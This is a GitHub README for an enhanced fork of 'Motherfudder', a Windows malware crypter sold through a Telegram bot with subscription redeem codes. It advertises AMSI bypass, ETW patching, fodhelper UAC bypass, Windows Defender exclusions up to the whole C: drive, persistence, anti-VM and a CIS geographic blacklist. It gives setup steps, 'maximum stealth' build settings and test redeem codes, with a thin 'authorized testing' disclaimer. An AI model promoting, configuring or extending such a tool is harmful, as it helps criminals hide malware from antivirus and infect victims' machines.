# ?? MOTHERFUDDER CRYPTER

**Production-Ready Windows Crypter** | **Telegram Bot + CLI** | **Enhanced by Florin**

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows-blue.svg)]()
[![Language](https://img.shields.io/badge/language-Rust%20%7C%20C%23-orange.svg)]()

---

## ?? Quick Start (30 Seconds!)

```batch
# Windows (Run as Administrator)
MOTHERFUDDER.bat
```

**That's it!** The central control panel handles everything:
- ? Install all prerequisites (Rust, .NET, etc.)
- ? Configure Telegram bot
- ? Host the bot
- ? Check for updates
- ? Build CLI mode

**One .bat file to rule them all!** ??

---

## ? Credits

### Original Project
**[Motherfudder by backdoorskid](https://github.com/backdoorskid/Motherfudder)**
- Original crypter concept and base implementation

**? Please star the original repository!**

### This Enhanced Fork
**Author**: **Florin**

**Major Enhancements** (+13,000 lines):
- ?? Full Telegram bot with interactive UI
- ?? Subscription/redeem code system
- ?? Interactive inline keyboard buttons
- ?? Complete documentation suite (24+ files)
- ?? C:\ drive exclusion (aggressive mode)
- ??? Enhanced AMSI bypass (Chainski technique)
- ?? MEGA central control panel (.bat automation)
- ?? Auto-update system

**From "broken" ? Production-ready powerhouse!**

---

## ? Features

### Core Evasion
- ? **AMSI Bypass** (.NET) - Chainski technique
- ? **ETW Patching** (.NET) - Blocks event tracing
- ? **UAC Bypass** - Silent elevation (fodhelper.exe)
- ? **Defender Exclusion** - 2 modes (standard + aggressive)
- ? **C:\ Drive Exclusion** - Nuclear option ??
- ? **Persistence** - Auto-start on boot
- ? **Anti-Debug** - Debugger detection
- ? **Anti-VM** - Virtual machine detection
- ? **Blacklist CIS** - Geographic restrictions
- ? **Single Instance** - Mutex-based

### Interface Modes
- ?? **Telegram Bot** - Interactive buttons, subscription system, FAQ, support
- ?? **CLI Mode** - JSON configuration, batch processing

### Binary Support
- ?? Native x86/x64
- ?? .NET x86/x64

---

## ?? Documentation

**Quick Access**:
- ?? [**SETUP_GUIDE.md**](SETUP_GUIDE.md) - Complete setup guide
- ?? [**Full Documentation Index**](docs/DOCUMENTATION_INDEX.md) - All 24+ docs

**Essential Docs**:
- [Installation Guide](docs/INSTALLATION.md)
- [Quick Start (5 min)](docs/QUICKSTART.md)
- [Features Guide](docs/FEATURES.md)
- [Bot Setup](docs/BOT_SETUP.md)
- [FAQ](docs/BOT_PREVIEW.md#faq)

**Advanced**:
- [UAC Bypass Info](docs/UAC_BYPASS_INFO.md)
- [Defender Exclusion](docs/DEFENDER_EXCLUSION_INFO.md)
- [Aggressive Mode Warning](docs/AGGRESSIVE_MODE_WARNING.md)
- [PowerShell Visibility](docs/POWERSHELL_VISIBILITY.md)

---

## ?? MEGA Control Panel

Run `MOTHERFUDDER.bat` to access the central control panel:

```
????????????????????????????????????????
?   MOTHERFUDDER CRYPTER - v1.0.0      ?
?   Central Control Panel              ?
????????????????????????????????????????

1. ?? Install Prerequisites (One-Click Setup)
2. ?? Configure Telegram Bot
3. ?? Host Telegram Bot
4. ?? Build CLI Mode
5. ?? Check for Updates
6. ?? Documentation
7. ? Help & Support
8. ?? Exit

Choose an option:
```

**Features**:
- ? One-click prerequisite installation
- ? Bot configuration wizard
- ? Easy bot hosting
- ? Auto-update checker
- ? Documentation access
- ? Help & support

---

## ?? Telegram Bot Preview

```
?? MOTHERFUDDER CRYPTER BOT

[?? Redeem Code]  [?? My Subscription]
[?? Crypt File]
[? FAQ]  [?? Support]
```

**Interactive Features**:
- ?? Subscription system with redeem codes
- ?? Real-time button toggles (?/?)
- ?? Status tracking
- ? Built-in FAQ
- ?? Support contact

**Test Codes**:
- `MFCRYPT-LIFETIME-2024`
- `FLORIN-VIP-BETA`
- `BACKDOORSKID-PRO`

---

## ? Quick Commands

**Install Everything** (One-Click):
```batch
MOTHERFUDDER.bat
? Press 1
```

**Host Telegram Bot**:
```batch
MOTHERFUDDER.bat
? Press 3
```

**CLI Mode** (Manual):
```batch
cd MfBuilder
cargo run --release
```

---

## ??? Configuration

### Telegram Bot
Edit subscription codes in `MfBuilder/src/telegram_bot.rs`:
```rust
pub const SUBSCRIPTION_CODES: &[&str] = &[
    "YOUR-CODE-HERE",
];
```

### CLI Mode
Edit `MfBuilder/build.json`:
```json
{
    "file_extension": "BAT",
    "anti_debug": true,
    "defender_exclusion": true,
    "uac_bypass": true
}
```

---

## ?? Recommended Configuration

**Maximum Stealth**:
```json
{
    "uac_bypass": true,
    "defender_exclusion": true,
    "defender_exclude_drive": false,
    "persistence": true
}
```

**Maximum Evasion** (?? Testing Only):
```json
{
    "uac_bypass": true,
    "defender_exclusion": true,
    "defender_exclude_drive": true,
    "persistence": true
}
```

---

## ?? Stats

**Original vs Enhanced**:

| Feature | Original | This Fork |
|---------|----------|-----------|
| Status | "Requires rework" | ? Production Ready |
| Code Lines | Unknown | +13,000 lines |
| Telegram Bot | ? None | ? Full featured |
| Interactive UI | ? None | ? Inline buttons |
| Subscription | ? None | ? Redeem codes |
| Automation | ? None | ? MEGA .bat |
| Docs | Minimal | 24+ files |

---

## ?? Disclaimer

**This tool is for authorized security testing, penetration testing, and educational purposes only.**

Users are responsible for complying with applicable laws. Unauthorized use is illegal and unethical.

See [LICENSE](LICENSE) for full terms.

---

## ?? Acknowledgments

**Original**:
- [backdoorskid/Motherfudder](https://github.com/backdoorskid/Motherfudder)

**Research**:
- [Chainski's GlobalAMSIBypass](https://github.com/Chainski/GlobalAMSIBypass)
- [EvilBytecode/Ebyte-Syscalls](https://github.com/EvilBytecode/Ebyte-Syscalls)
- [EvilBytecode/Lifetime-Amsi-EtwPatch](https://github.com/EvilBytecode/Lifetime-Amsi-EtwPatch)

**Enhanced by**: Florin

---

## ?? Support

- ?? **Contact**: @YourSupportBot (Telegram)
- ?? **Issues**: GitHub Issues
- ?? **Docs**: [Documentation Index](docs/DOCUMENTATION_INDEX.md)
- ? **Star**: Please star both repos if this helps you!

---

## ?? Get Started Now!

```batch
# 1. Download the project
git clone https://github.com/your-repo/motherfudder-enhanced

# 2. Run the control panel (as Admin)
cd motherfudder-enhanced
MOTHERFUDDER.bat

# 3. Press '1' to install everything
# 4. Press '2' to configure bot
# 5. Press '3' to host bot
# 6. Done! ??
```

**That's it! Everything is automated!** ??

---

**?? From a broken crypter to a production-ready powerhouse with 13,000+ lines of enhancements!**

? **Star this repo and the original if it helps you!**
